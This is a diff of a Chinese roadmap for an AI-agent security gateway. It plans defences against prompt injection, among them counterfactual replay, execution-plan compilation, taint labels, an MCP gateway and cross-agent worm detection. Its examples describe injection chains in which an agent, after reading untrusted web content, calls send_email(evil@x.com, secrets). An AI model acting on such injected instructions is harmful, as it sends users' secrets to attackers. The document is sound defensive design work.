@@ -322,85 +322,328 @@
 
 ---
 
-### Phase 2: 架构演进 — 需要上下游配合或龙虾卫士新增代理能力
+### Phase 2: 学术前沿转化 — 从检测到可证明安全
 
-> v21+ 需要与 OpenClaw 协议约定（Header/Webhook）或新增 MCP Proxy 能力
-> 集中处理 Agent 身份识别、MCP 工具调用可见性等架构问题
+> **Phase 2 核心主题**: 将 2025-2026 前沿学术成果系统性转化为产品功能
+> 基于 16 篇论文调研（2026-03-25），重点落地 4 个方向：
+> - **CaMeL** (Google, arXiv:2503.18813) — 控制流/数据流分离，设计上消灭注入
+> - **AttriGuard** (arXiv:2603.10749) — 因果归因，反事实检验 tool call 来源
+> - **Runtime Governance** (arXiv:2603.16586) — 路径级策略，执行历史感知
+> - **Fides/IFC** (Microsoft, arXiv:2505.23643) — 信息流控制，变量级污点追踪
+>
+> 架构演进策略: **先叠加、后重构**
+> v23-v25 在现有三条数据通道上叠加学术成果（不需要上下游改造）
+> v26-v28 需要 MCP Proxy + Agent 身份协议
+> v29+ 企业级 + 生态
 
-### v21.x — Agent 身份 · MCP 代理 · 意图声明 🔥🔥
-> 看见 Agent，看见 MCP | Phase 2 的基础设施版本
-> 依赖：🔧 需要 OpenClaw 侧协议配合（Header 约定）+ 龙虾卫士新增 MCP Proxy 端口
+### v23.x — 路径级策略引擎 · 上下文感知安全决策 🔥🔥
+> 从"无状态规则匹配"到"有记忆的安全判断" | 最小改造量，最大效果提升
+> 理论基础：Runtime Governance (arXiv:2603.16586) — 执行路径是治理的核心对象
+> 依赖：✅ 纯内部改造（现有 TraceCorrelator + RuleEngine 扩展）
 
-- [ ] v21.0 **Agent 身份识别协议**
+- [ ] v23.0 **路径级策略引擎（PathPolicyEngine）**
+  - **核心**: 规则不再是 `f(input) → decision`，而是 `f(agent_identity, partial_path, proposed_action, org_state) → violation_prob`
+  - 同一个操作在不同执行历史下触发不同策略：
+    - "读取客户邮箱" 如果之前用户授权了 → 合规
+    - "读取客户邮箱" 如果之前刚从不可信网页读了数据 → 可能是注入链一环 → 拦截
+  - **Path Context 结构**:
+    ```
+    PathContext {
+      trace_id:     string          // 会话标识
+      steps:        []PathStep      // 已执行步骤序列
+      taint_labels: []TaintLabel    // v20.1 污染标签
+      tool_history: []ToolCallRef   // v20.0 工具调用历史
+      risk_score:   float64         // 路径累积风险分
+    }
+    ```
+  - **策略类型**:
+    - 序列策略: "在调用 web_fetch 之后 30s 内不允许 send_email"
+    - 累积策略: "单次会话 PII 暴露超过 3 个字段 → 升级为 block"
+    - 降级策略: "路径风险分 > 80 → 后续所有 tool call 降级为 warn 确认"
+  - 数据来源：TraceCorrelator 已有会话状态 + RuleEngine 扩展 PathContext 参数
+  - Dashboard: 路径策略编辑器（可视化 if-then 链 + 时间窗口配置）
+
+- [ ] v23.1 **路径风险评分 + 实时降级**
+  - 每个 PathStep 贡献增量风险分（权重可配）：
+    - 外部数据读取 +10 / PII 接触 +20 / 高危 tool call +30 / 蜜罐触碰 +50
+  - 风险分随时间衰减（半衰期可配，默认 5 分钟）
+  - 阈值触发：score > 60 → warn / score > 80 → block / score > 95 → 会话隔离
+  - 与 v11.0 攻击者画像联动：高风险用户的起始分更高（先验调整）
+  - Dashboard: 实时路径风险仪表（类似飞行高度表，每个活跃会话一个）
+
+- [ ] v23.2 **AI Act 合规策略模板**
+  - 参考论文中 AI Act 启发的策略示例，预置合规模板：
+    - 高风险 AI 系统：所有决策必须可解释 + 执行信封
+    - 数据最小化：出站数据字段数不超过任务最小集
+    - 人类监督：高风险操作需要人类确认（通过 IM 回调）
+  - 策略模板与 v12.0 合规报告引擎联动：策略违反自动出现在合规报告中
+
+### v24.x — 因果归因防御 · 反事实验证 🔥🔥🔥
+> "这个 tool call 是用户想要的，还是注入驱动的？" | 防御范式革命：从语义检测到因果推断
+> 理论基础：AttriGuard (arXiv:2603.10749) — 行动级因果归因，反事实测试
+> 依赖：✅ 现有 LLMProxy + 上游路由能力（用于反事实重放）
+
+- [ ] v24.0 **反事实验证引擎（CounterfactualVerifier）** 🔥
+  - **核心原理**: 对每个可疑 tool call，构造"没有外部数据"的对照请求重放
+    1. LLM 提出 tool_call（如 `send_email(evil@x.com, secrets)`）
+    2. 龙虾卫士截获，构造对照 prompt：移除所有外部数据（tool_result / 网页内容 / 文件内容）
+    3. 将对照 prompt 发给**同一个 LLM 上游**重新推理
+    4. 比对：对照组是否也发起相同 tool_call？
+      - 是 → 用户意图驱动 → 放行
+      - 否 → 外部数据驱动 → 高概率注入 → 拦截
+  - **关键技术**:
+    - **Teacher-Forced Shadow Replay**: 重放时锁定之前的 tool call 决策，只改变最新一步的输入
+    - **Control Attenuation**: 不是完全删除外部数据，而是梯度衰减（保留任务相关信息，移除控制信号）
+    - **Fuzzy Survival Criterion**: LLM 输出有随机性，允许参数级别差异（如邮箱地址不同但 tool 名相同 → 算存活）
+  - **性能优化**:
+    - 不是每个 tool call 都反事实验证（太贵），只验证**可疑**的：
+      - 高危 tool（shell_exec / send_email / file_write）
+      - 路径风险分 > 阈值（v23.1 联动）
+      - 首次出现的 tool + 参数组合
+    - 异步验证模式：先放行，后台验证，不一致则追溯告警（适合低延迟场景）
+    - 同步验证模式：等验证完再放行（适合高安全场景，延迟增加 1-3s）
+  - 数据来源：LLMProxy 已有的请求/响应流 + 上游路由能力（重放请求）
+  - Dashboard: 反事实验证日志（原始 vs 对照 的 tool_call diff 可视化）
+
+- [ ] v24.1 **因果归因审计 + 可解释安全决策**
+  - 每次反事实验证生成 **归因报告（Attribution Report）**：
+    ```
+    {
+      original_tool_call: "send_email(evil@x.com, ...)",
+      counterfactual_result: "summarize(report)",     // 没有外部数据时 LLM 做的事
+      causal_driver: "tool_result[web_fetch]",        // 导致差异的因果来源
+      attribution_score: 0.95,                        // 因果强度（0=用户驱动, 1=注入驱动）
+      verdict: "INJECTION_DRIVEN",
+      evidence_chain: [...]                           // 完整推理证据链
+    }
+    ```
+  - 与 v18.0 执行信封联动：归因报告签名为密码学证据
+  - 与 v11.0 攻击者画像联动：频繁触发注入驱动 → 用户风险分飙升
+  - Dashboard: 因果归因时间线（每个被拦截的 tool call 展示"为什么被判定为注入"）
+
+- [ ] v24.2 **自适应验证策略 + 验证成本控制**
+  - 验证预算：每小时最多 N 次反事实验证（控制 LLM 调用成本）
+  - 智能选择：用 v23.1 路径风险分排序，优先验证风险最高的 tool call
+  - 验证缓存：相同 prompt 模式 + 相同 tool call → 复用上次验证结果（TTL 可配）
+  - 验证效果追踪：准确率 / 误报率 / 平均延迟 / 月成本 → Dashboard 展示
+  - 论文效果基线（可作为 benchmark）：静态攻击 0% ASR · 自适应攻击下仍保持韧性
+
+### v25.x — 控制流/数据流分离 · 执行计划编译 🔥🔥🔥🔥🔥
+> 龙虾卫士最核心的架构升级 — 从"检测坏东西"到"只允许好东西"
+> 理论基础：CaMeL (Google, arXiv:2503.18813) — 用程序解释器取代 LLM 的控制权
+> 依赖：✅ 现有 LLMProxy（解析 tool_calls 序列）+ InboundProxy（提取用户 query）
+> 参考实现：github.com/google-research/camel-prompt-injection
+
+- [ ] v25.0 **执行计划编译器（PlanCompiler）** 🔥🔥
+  - **核心架构变革**:
+    ```
+    传统: 用户 → LLM 自己决定做什么 → 执行
+    CaMeL: 用户 → 编译成确定性执行计划 → LLM 只填语义槽 → 执行计划
+    龙虾卫士: 用户 → LLM 提出计划 → 龙虾卫士编译+验证 → 执行
+    ```
+  - **龙虾卫士实现方式**（网关级 CaMeL，不改 Agent 代码）:
+    1. InboundProxy 截获用户 query，提取**预期意图**
+    2. LLMProxy 截获 LLM 的 tool_calls 序列，提取**实际计划**
+    3. PlanCompiler 将预期意图编译成**允许的执行计划模板**（Plan Template）
+    4. 比对实际计划 vs 允许模板 → 一致 = 放行 / 不一致 = 注入
+  - **Plan Template 格式**:
+    ```yaml
+    plan:
+      intent: "summarize_and_send"
+      allowed_sequence:
+        - tool: web_fetch
+          constraints: { url_domain: "*.qianxin.com" }
+          output_label: { conf: PUBLIC, integ: LOW }
+        - tool: summarize
+          input_from: [step_0]
+          output_label: { conf: PUBLIC, integ: MEDIUM }
+        - tool: send_email
+          input_from: [step_1]           # 只能用 summarize 的输出
+          constraints: { recipient_in: "contacts_list" }
+      forbidden:
+        - tool: shell_exec              # 这个意图绝对不需要 shell
+        - tool: file_write              # 也不需要写文件
+    ```
+  - **意图→模板编译**:
+    - 预置模板库：常见业务场景 20+ 模板（查联系人/建日程/读邮件/写报告…）
+    - LLM 辅助编译：对长尾意图，用隔离 LLM（无 tool 权限）生成模板草案 → 确定性验证器校验
+    - 管理员自定义模板：YAML 编辑器 + 可视化流程图
+  - 数据来源：InboundProxy（用户 query）+ LLMProxy（tool_calls 序列）
+  - Dashboard: 执行计划管理页（模板库 + 编译日志 + 偏差可视化）
+
+- [ ] v25.1 **Capability 权限系统**
+  - 每个数据变量携带 **capability 标签**（CaMeL 核心创新）:
+    ```
+    capability("email_write")   — 允许发送邮件
+    capability("file_read")     — 允许读文件
+    capability("shell_exec")    — 允许执行命令
+    capability("pii_access")    — 允许接触 PII
+    ```
+  - **传播规则**:
+    - 用户直接输入 → 继承用户权限声明的 capabilities
+    - Tool 返回的外部数据 → 零 capability（不能用于触发任何操作）
+    - LLM 总结 → 继承输入的 capability 的交集
+  - **执行检查**: tool call 需要的 capability ∉ 参数携带的 capability → 拦截
+    - 例：`send_email(content_from_web_fetch)` → web_fetch 输出没有 `email_write` → 拦截
+    - 例：`send_email(user_typed_content)` → 用户输入有 `email_write` → 放行
+  - 与 v20.1 污染标签联动：TAINTED 数据自动剥夺所有 capability
+  - 与 v23.0 路径策略联动：路径风险分 > 阈值 → 动态收窄 capability 范围
+  - Dashboard: Capability 矩阵（哪些 Agent / 用户 / 数据源 拥有哪些权限）
+
+- [ ] v25.2 **Plan 偏差检测 + 自动修复**
+  - 实时比对 LLM 实际 tool_call 序列 vs PlanCompiler 编译的模板
+  - 偏差类型分级：
+    - **Minor**: tool 参数差异（允许，记录）
+    - **Moderate**: tool 顺序调整（告警，人工确认）
+    - **Critical**: 出现 forbidden tool / 未声明 tool / capability 违规（拦截）
+  - 自动修复模式（可选）：
+    - 对 Minor/Moderate 偏差，自动重写 tool_call 参数使其符合模板约束
+    - 例：`send_email(all@company.com)` → 模板限制 `recipient_in: team_only` → 重写为 `send_email(team@company.com)`
+  - 论文效果基线：AgentDojo benchmark 77% 任务完成率 + 可证明安全性
+
+### v26.x — 信息流控制 · 变量级污点追踪 🔥🔥🔥🔥
+> 从 trace 级污染升级到变量级污染 | 安全保证的数学证明
+> 理论基础：Fides/IFC (Microsoft, arXiv:2505.23643) — Bell-LaPadula 模型 + 动态污点追踪
+> 依赖：✅ v25.1 Capability 系统（提供标签基础设施）
+> 参考实现：github.com/microsoft/fides
+
+- [ ] v26.0 **双标签系统（Confidentiality + Integrity）**
+  - **v20.1 到 v26.0 的飞跃**:
+    - v20.1: trace 级标签（整个会话 TAINTED 或不 TAINTED）
+    - v26.0: 字段级标签（每个变量独立的机密性+完整性标签）
+  - **标签定义**:
+    ```
+    Confidentiality: PUBLIC < INTERNAL < CONFIDENTIAL < SECRET
+    Integrity:       TAINT < LOW < MEDIUM < HIGH
+
+    标签来源:
+      system_prompt:      { conf: SECRET,       integ: HIGH }
+      user_direct_input:  { conf: INTERNAL,     integ: MEDIUM }
+      tool_response:
+        web_fetch:        { conf: PUBLIC,       integ: TAINT }
+        database_query:   { conf: CONFIDENTIAL, integ: LOW }
+        mcp_tool_result:  { conf: INTERNAL,     integ: LOW }
+      tool_call_params:
+        shell_exec:       { required_integ: HIGH }
+        send_email:       { required_integ: MEDIUM, max_conf: INTERNAL }
+        file_write:       { required_integ: MEDIUM }
+    ```
+  - **传播规则**（Fides 核心）:
+    ```
+    var_c = func(var_a, var_b)
+    → var_c.confidentiality = max(var_a.conf, var_b.conf)  // 机密性取高
+    → var_c.integrity = min(var_a.integ, var_b.integ)       // 完整性取低
+    ```
+  - **安全检查**:
+    - 机密性: 数据流向的通道 conf 等级 ≥ 数据的 conf 等级（不能泄露）
+    - 完整性: tool call 要求的 integ 等级 ≤ 参数的 integ 等级（不能被污染数据驱动）
+  - 与 v25.1 Capability 联动：capability 作为第三个维度，IFC 标签+capability 双重检查
+  - Dashboard: IFC 策略编辑器（标签来源配置 + 传播规则可视化 + 违规日志）
+
+- [ ] v26.1 **隔离 LLM（Quarantined LLM）**
+  - **核心创新**（Fides 独有）: 被污染数据不能直接喂给主 Agent，需要先经过隔离 LLM 处理
+  - **工作流**:
+    ```
+    正常路径: 用户消息 → 龙虾卫士 → 主 Agent（完整 tool 权限）
+    隔离路径: 被污染数据 → 龙虾卫士检测到 integ=TAINT
+              → 路由到隔离上游（只有只读 tool 权限）
+              → 隔离 LLM 产出总结/摘要
+              → 总结的 integ 提升为 MEDIUM（去污）
+              → 主 Agent 使用去污后的总结
+    ```
+  - **龙虾卫士实现**: 利用现有多上游路由能力
+    - 配置一个 "quarantine" 上游（OpenClaw 实例，限制 tool 为只读子集）
+    - IFC 引擎检测到 TAINT 数据进入高 integ 操作 → 自动切换路由到 quarantine 上游
+    - quarantine 输出自动标记为 MEDIUM integ
+  - 与 v20.2 污染链逆转联动：quarantine 就是一种更优雅的"解毒"方式
+
+- [ ] v26.2 **选择性隐藏（Selective Hiding）+ DOE 检测**
+  - **选择性隐藏**: 向 LLM 隐藏高机密字段
+    - LLM 看到的是: `{name: "张三", phone: "[REDACTED:conf=SECRET]", dept: "安全"}`
+    - LLM 推理不基于被隐藏字段，保证机密性
+  - **跨 Tool DOE 检测**（AgentRaft 启发, arXiv:2603.07557）:
+    - 用 v25.0 的执行计划模板确定"任务最小字段集"
+    - 比对 tool 间实际传输的字段 vs 最小集
+    - 超出 → 标记 Data Over-Exposure → 按严重度 log/warn/block
+    - DOE 三级: info（多传了非敏感字段）/ warning（PII 跨 tool 传输）/ critical（敏感数据跨信任边界）
+  - Dashboard: 数据流视图（tool call graph + 高亮 DOE 路径 + 字段级别 diff）
+
+### v27.x — Agent 身份 · MCP 安全网关 · 跨 Agent 安全 🔥🔥🔥
+> Phase 2 的基础设施 + MCP 安全生态卡位
+> 理论基础：SMCP (arXiv:2602.01129) + MCPShield (arXiv:2602.14281) + MCPSec (arXiv:2601.17549)
+> 依赖：🔧 需要 OpenClaw 侧协议配合 + 新增 MCP Proxy 端口
+
+- [ ] v27.0 **Agent 身份识别协议**
   - 定义 `X-Lobster-Agent-ID` / `X-Lobster-Agent-Name` / `X-Lobster-Session-Key` Header 规范
   - OutboundProxy 解析 Agent 元信息，审计日志增加 agent_id 维度
   - Agent 注册表：已知 Agent 列表 + 首次出现自动发现 + Dashboard 管理页面
   - 行为推断兜底：对不携带 Header 的流量，用 TraceCorrelator 时间窗口关联推断
-  - Agent 维度聚合：安全事件 / 成本 / 行为画像 全部按 Agent 拆分
-- [ ] v21.1 **MCP Proxy 端口（:8445）**
-  - 龙虾卫士新增第四个监听端口，作为 MCP 工具调用的透明代理
-  - 支持 MCP HTTP SSE 传输协议（拦截 `tools/call` / `tools/list` 等方法）
-  - OpenClaw 配置 MCP Server 地址指向龙虾卫士 → 龙虾卫士转发到真实 MCP Server
-  - 完整审计：工具名称 / 输入参数 / 输出结果 / 延迟 / 风险标签
-  - MCP 调用与 LLM tool_calls 通过 trace_id 关联：LLM 决定调什么（v20.0）↔ 实际调了什么（v21.1）
-  - MCP 返回数据的真实 PII 检测 → 补充 v20.1 的污染标签（从意图推断升级为事实确认）
-- [ ] v21.2 **意图声明式安全 + Policy-as-Code**
-  - Agent 注册时提交意图声明（YAML）：允许的 MCP 工具、允许的数据范围、允许的行为模式
-  - 运行时校验：MCP 调用超出声明范围 → 直接阻断
-  - IM 消息超出声明的行为模式 → 告警 + 关联攻击链
-  - 灵感来源：Telos Intent Declaration · Kvlar Policy-as-Code · AvaKill YAML Policy
-  - 理论基础：停机问题/Rice 定理（完美检测不可能 → 白名单优于黑名单）
+  - Agent 维度聚合：安全事件 / 成本 / 行为画像 / IFC 违规 全部按 Agent 拆分
 
-### v22.x — Gateway 监控 · Agent 运营中心 · SVG 统一 
-> 从安全网关升级为运维中枢 | 实时监控上游 OpenClaw Gateway 实例
+- [ ] v27.1 **MCP 安全网关（:8445）**
+  - 龙虾卫士新增第四个监听端口，作为 MCP 安全代理
+  - **SMCP 五层安全（透明叠加，不改 MCP 协议）**:
+    1. 统一身份管理: MCP Server 注册 + 证书/Token 认证
+    2. 双向认证: Agent↔Server 通过龙虾卫士中转时自动互验
+    3. 安全上下文传播: v26.0 IFC 标签跨 MCP 调用自动传播
+    4. 细粒度策略执行: 每个 tool call 经过 v23.0 路径策略 + v25.1 Capability 检查
+    5. 全面审计: 所有 MCP 交互记录到独立 SQLite 表
+  - **MCPShield 动态信任（运行时自适应）**:
+    - 首次调用 MCP tool → 低信任分（受限模式：只允许读操作）
+    - 连续 N 次正常调用 → 信任分提升（正常模式）
+    - 检测到异常（返回数据含注入 / 超时 / schema 不匹配）→ 信任分暴跌 → 降级
+    - 信任分存 SQLite，持久化跨重启
+  - **MCPSec 协议加固（8.3ms 延迟实现 52.8%→12.4% 攻击成功率下降）**:
+    - Capability Attestation: MCP Server 声明的权限 vs 实际行为 → 不一致告警
+    - Message Authentication: 请求/响应 HMAC 签名（复用 v18.0 执行信封密钥）
+    - Trust Isolation: 多 MCP Server 之间信任不传播（Server A 可信不代表 Server B 可信）
+  - MCP 调用与 LLM tool_calls 通过 trace_id 关联
+  - Dashboard: MCP 安全仪表盘（Server 注册表 · 信任分趋势 · 调用审计 · 威胁告警）
 
-- [x] v22.0 **Gateway 监控中心基础**（拓扑视图 · 上游管理 · Token 配置 · 三步诊断 · 7 个 Gateway 监控 API）
-- [x] v22.1 **tools/invoke 协议重构**（发现 OpenClaw `POST /tools/invoke` 是唯一 HTTP API · `gatewayToolsInvoke` 替换 GET 假接口 · 6 个 tool 验证 · HTML 响应检测 · `/gateway/agents` API · 上游 Token 配置集成）
-- [x] v22.2 **Agent 运营中心 5 视图**（📊 仪表盘：Token 饼图+上下文使用率+运维信息 · 🃏 详情卡片：模型/进度条/会话分类/渠道 · 🌳 协作视图：Gateway→Agent→Session 树+Cron 关联 · 👥 用户归因：SVG 环形图 Token/用户 · 🧩 Skill 目录：文件系统扫描 54 skills+分类+搜索）
-- [x] v22.3 **Per-Upstream AOC + 威胁地图修复**（AOC 从全局底部移入上游展开行第 4 tab · 每个上游独立 Agent/Token/Skill 数据 · 威胁地图回连路径修复：Claude→LLM 检测→OpenClaw）
-- [x] v22.4 **emoji→SVG 全站图标统一**（9 处替换：tab/AOC 视图/操作/诊断/渠道/会话类型/Cron/Skill/分类 · feather-icon 风格 · 视觉一致性）
+- [ ] v27.2 **跨 Agent 安全 + 蠕虫检测**
+  - 依赖 v27.0 Agent 身份识别
+  - **跨 Agent 污染传播**: Agent A 的 TAINTED 输出 → 成为 Agent B 的输入 → v26.0 IFC 标签跨 Agent 传播
+  - **蠕虫检测**: 检测 Agent→Agent 感染链模式
+    - 感染拓扑图可视化（传播路径、感染时间线）
+    - 自动隔离已感染 Agent（切断路由、标记污染）
+  - 与 v24.0 AttriGuard 联动：跨 Agent 的 tool call 也做反事实验证
+  - 理论基础：洞见 #33/#35（蠕虫化 + 涌现安全）
 
-### v23.x — 跨 Agent 安全 · 蠕虫检测 🔥🔥
-> 当有了 Agent 身份，才能做跨 Agent 分析 | 理论基础：洞见 #33/#35（蠕虫化 + 涌现安全）
-> 依赖：🔧 需要 v21 的 Agent 身份识别 + MCP Proxy
+### v28.x — AI 安全运营副驾驶 · 自动化验证 🔥🔥
+> 安全运营智能化 + 论文 benchmark 接入
+> 理论基础：Nash 均衡（安全均衡需要被设计）
 
-- [ ] v23.0 **跨 Agent 污染传播检测**
-  - Agent A 的敏感输出 → 成了 Agent B 的输入 → 污染标签跨 Agent 传播
-  - 需要 Agent 身份才能区分"A 发出的"和"B 收到的"
-  - 与 v20.1 的 trace 级污染追踪互补：v20.1 追踪单次会话内，v23.0 追踪跨 Agent 间
-- [ ] v23.1 **跨 Agent 蠕虫检测**
-  - 检测 Agent→Agent 感染链模式（洞见 #33 第四跳蠕虫化）
-  - 感染拓扑图可视化（传播路径、感染时间线）
-  - 自动隔离已感染 Agent（切断路由、标记污染）
-
-### v24.x — AI 安全助手 · 生态平台 🔥
-> 安全运营副驾驶 + 社区生态 | 理论基础：Nash 均衡（安全均衡需要被设计）+ 涌现安全
-> 依赖：🔧 需要调用外部 LLM API（安全助手推理）+ 插件生态
-
-- [ ] v24.0 **AI 安全运营副驾驶**
+- [ ] v28.0 **AI 安全运营副驾驶**
   - 自然语言查询安全态势："过去 24 小时有什么异常？""这个用户为什么风险分飙升了？"
   - 攻击链智能分析："这 5 个事件之间有什么关联？""下一步攻击者可能做什么？"
-  - 自动生成安全建议："建议启用严格模式""这条规则应该从 warn 改为 block"
+  - **因果归因可解释性**（v24.1 联动）：副驾驶可以解释"这个 tool call 被拦截是因为反事实验证表明它是由外部数据驱动的"
+  - **IFC 违规分析**（v26.0 联动）：副驾驶可以解释"这个数据流违反了机密性规则，因为 SECRET 数据流向了 PUBLIC 通道"
   - 元认知安全框架（Reflexive-Core 启发）：预检→安全分析→受控执行→合规验证
-  - 灵感来源：NGSOC 安全运营副驾驶 · Reflexive-Core 元认知安全
-- [ ] v24.1 **Guardrail 市场**
-  - 社区贡献规则包（行业模板：金融 / 医疗 / 政务 / 教育）
-  - 第三方检测器插件（基于 v19.2 SDK）
-  - 通道插件市场 · 安装 / 更新 / 评分 / 审计机制
-  - 灵感来源：Guardrails Hub（吸取洞见 #18 供应链攻击教训，所有插件必须安全审计）
-- [ ] v24.2 **OpenTelemetry 接入**
-  - 导出 traces 到 Jaeger / Grafana Tempo / Datadog
-  - 安全事件作为 span 嵌入业务 trace
 
-### v25.x — 分布式部署 · 企业级
+- [ ] v28.1 **AgentDojo/AgentDyn Benchmark 自动化**
+  - 集成 AgentDojo (NeurIPS 2024) + AgentDyn (arXiv:2602.03117) 安全基准测试
+  - 定期自动运行 benchmark，追踪防御效果随版本的变化：
+    - Task Completion Rate（功能不退化）
+    - Attack Success Rate（安全在提升）
+    - False Positive Rate（误报在下降）
+  - CI/CD 集成：每次发版自动跑 benchmark，低于基线不允许合入
+  - Dashboard: Benchmark 趋势页（每个版本的三个指标折线图）
+
+- [ ] v28.2 **Guardrail 市场 + OpenTelemetry**
+  - 社区贡献规则包（行业模板：金融/医疗/政务/教育）+ IFC 策略模板
+  - 第三方检测器插件（基于 v19.2 SDK）
+  - OpenTelemetry 接入：安全事件+IFC 标签 作为 span attribute 导出
+
+### v29.x — 分布式部署 · 企业级
 > 水平扩展 · 高可用 | 理论基础：CAP 定理（分布式安全的权衡选择）
 > 依赖：🔧 需要 PostgreSQL + 多实例协调
 
-- [ ] v25.0 **PostgresStore + 多实例**
+- [ ] v29.0 **PostgresStore + 多实例**
   - SQLite → PostgreSQL 存储后端（保持 SQLite 兼容用于单机模式）
+  - IFC 标签 + Capability + 路径策略 跨节点同步
   - 多实例部署：Leader 选举 · 路由状态同步 · 读写分离
   - 执行信封跨节点验证链（v18 延伸：分布式证据链完整性验证）
-- [ ] v25.1 **弹性伸缩 + 零停机升级**
+- [ ] v29.1 **弹性伸缩 + 零停机升级**
   - 滚动更新：新旧版本共存期间路由无感知切换
   - 配置热同步：修改一个节点的配置自动同步到集群
 
@@ -409,10 +652,13 @@
 > 以下是尚未排期但值得关注的方向
 
 - [ ] **eBPF/LSM 内核级执行管控**（Telos 启发：在 Linux 内核层面拦截 Agent 系统调用）
+- [ ] **Proof-of-Guardrail**（arXiv:2603.05786, TEE 密码学证明审计日志不可篡改）
 - [ ] **联邦安全学习**（多组织共享攻击模式但不共享数据）
 - [ ] **安全数字孪生**（克隆生产环境在镜像中运行红队测试）
-- [ ] **形式化验证**（对核心安全路径进行数学证明）
+- [ ] **形式化验证**（对 IFC 传播规则进行 Coq/Lean 数学证明）
 - [ ] **量子安全密码学迁移**（后量子签名算法替换 HMAC）
+- [ ] **SAFEFLOW 事务性 Agent 操作**（arXiv:2506.07564, write-ahead logging + rollback）
+- [ ] **Capability-Safe Language Harness**（arXiv:2603.00991, EPFL Odersky, 类型系统保证信息流安全）
 
 ---
 
@@ -621,37 +867,47 @@ Phase 1 — 纯流量（不改上下游，只靠已有三条数据通道）:
   v18:     密码学信任根 + 事件总线 + 工程化 (Docker/CI/OpenAPI)
   v19:     对抗性自进化 + 语义检测模型 + 插件 SDK
   v20:     LLM tool_calls 深度分析 + 信息流污染追踪 + 响应缓存 + API Gateway
+  v22:     Gateway 监控 + Agent 运营中心
 ------- v22.4 当前版本 · 以下为规划 -------
-Phase 1 收尾:
-  v18.3:   智能决策 + 奇点蜜罐
-  v19.3:   多语言检测 + 插件 SDK（降优先级）
-Phase 2 — 架构演进（需要上下游协议配合 + 新增 MCP Proxy）:
-  v21:     Agent 身份协议 + MCP Proxy(:8445) + 意图声明
-  v22:     跨 Agent 污染传播 + 蠕虫检测
-  v23:     AI 安全助手 + Guardrail 市场 + OTel
-  v24:     分布式部署 + PostgreSQL + 弹性伸缩
+Phase 2 — 学术前沿转化（2025-2026 论文 → 产品功能，先叠加后重构）:
+  v23:     路径级策略引擎 (Runtime Governance)         ← 最小改造量
+  v24:     因果归因防御 (AttriGuard 反事实验证)        ← 防御范式革命
+  v25:     控制流/数据流分离 (CaMeL 执行计划编译)      ← 核心架构升级
+  v26:     信息流控制 (Fides IFC 变量级污点追踪)       ← 数学保证安全
+Phase 3 — 生态扩展（MCP 安全网关 + 跨 Agent + 企业级）:
+  v27:     Agent 身份 + MCP 安全网关 + 跨 Agent 蠕虫检测
+  v28:     AI 安全副驾驶 + Benchmark 自动化 + Guardrail 市场
+  v29:     分布式部署 + PostgreSQL + 弹性伸缩
 
 产品定位演进:
-  v1-v5:   AI Agent 安全网关（被动防御）
-  v6-v9:   AI Agent 安全管控平台（防御 + 可视化 + 审计）
-  v10-v13: AI Agent 安全运营中心（分析 + 洞察 + 合规）
+  v1-v5:   AI Agent 安全网关（被动防御 — 规则匹配）
+  v6-v13:  AI Agent 安全运营中心（防御 + 可视化 + 审计 + 合规）
   v14-v17: 安全治理 + 态势感知（治理 + 主动防御 + 智能分析）
-  v18-v20: 可证明安全 + 自进化 + 信息流追踪（Phase 1 纯流量，把已有数据吃干榨净）
-  v21-v22: Agent 身份 + MCP 管控 + 跨 Agent 安全（Phase 2 架构演进）
-  v23-v24: 安全运营副驾驶 + 企业级分布式（AI 原生安全运营）
+  v18-v22: 可证明安全 + 自进化 + 信息流追踪（Phase 1 纯流量，把已有数据吃干榨净）
+  v23-v26: 🆕 可证明安全 2.0 — 学术前沿转化（因果推断 + 执行计划 + IFC + 路径策略）
+  v27-v28: MCP 安全网关 + AI 安全副驾驶（Phase 3 生态扩展）
+  v29:     企业级分布式（水平扩展 + 高可用）
+
+三个产品线:
+  A — Agent 防注入引擎（核心壁垒）  : v25 CaMeL + v24 AttriGuard + v19 语义检测
+  B — MCP 安全网关（市场热点卡位）   : v27 SMCP/MCPShield/MCPSec
+  C — 合规审计引擎（卖给政企）       : v26 IFC + v23 路径策略 + v12 合规报告
 ```
 
 ### 每个版本的理论根基
 
-| 版本 | 理论基础 | 核心洞见 |
-|------|---------|---------|
-| v18 | Gödel 不完备定理 | 安全无法自证 → 用密码学逼近可证明 |
-| v19 | 熵增定律 + 耗散结构 | 安全退化是物理必然 → 持续注入能量（红队）对抗熵增（自进化） |
-| v20 | Shannon 信息论 + 洞见 #18 | trace_id 就是污染载体 → 三段联合追踪（入站标记→LLM传播→出站拦截）|
-| v21 | 停机问题 / Rice 定理 | 完美检测不可能 → 白名单（意图声明）+ 看见 MCP 才能管 MCP |
-| v22 | 洞见 #33/#35 蠕虫/涌现 | 跨 Agent 污染传播 → 需要 Agent 身份才能做 |
-| v23 | Nash 均衡 + 涌现安全 | 安全均衡需要被设计 → AI 辅助全局视角 |
-| v24 | CAP 定理 | 分布式安全三选二 → 明确权衡选择 |
+| 版本 | 理论基础 | 核心论文 | 核心洞见 |
+|------|---------|---------|---------|
+| v18 | Gödel 不完备定理 | — | 安全无法自证 → 用密码学逼近可证明 |
+| v19 | 熵增定律 + 耗散结构 | — | 安全退化是物理必然 → 自进化对抗熵增 |
+| v20 | Shannon 信息论 | — | trace_id 是污染载体 → 三段联合追踪 |
+| **v23** | **Runtime Governance** | **arXiv:2603.16586** | **执行路径是治理核心 → 策略 = f(路径)** |
+| **v24** | **因果推断** | **arXiv:2603.10749 AttriGuard** | **不问"输入像不像注入"，问"tool call 被谁驱动"** |
+| **v25** | **CaMeL 控制流分离** | **arXiv:2503.18813 Google** | **不检测坏的，编译好的 → 注入无通道可走** |
+| **v26** | **Bell-LaPadula IFC** | **arXiv:2505.23643 Microsoft Fides** | **每个变量有数学标签 → 安全是可证明的** |
+| v27 | SMCP + MCPShield | arXiv:2602.01129 / 2602.14281 | MCP 安全是架构问题 → 网关层透明加固 |
+| v28 | Nash 均衡 | AgentDojo / AgentDyn | 安全均衡需要被设计 → AI 辅助全局视角 |
+| v29 | CAP 定理 | — | 分布式安全三选二 → 明确权衡选择 |
 
 ### 每个版本的反直觉创新 🔥
 
@@ -659,11 +915,35 @@ Phase 2 — 架构演进（需要上下游协议配合 + 新增 MCP Proxy）:
 |------|--------|
 | v18 | 日志不只是记录，是**密码学证据** |
 | v19 | 安全系统**自己攻击自己、自己修复自己** |
-| v20 | 不检测内容，**追踪数据的血统**；不需要看到 MCP，**trace_id 串起三段就够了** |
-| v21 | 不猜 Agent 身份，**让 Agent 自报家门**（协议约定） |
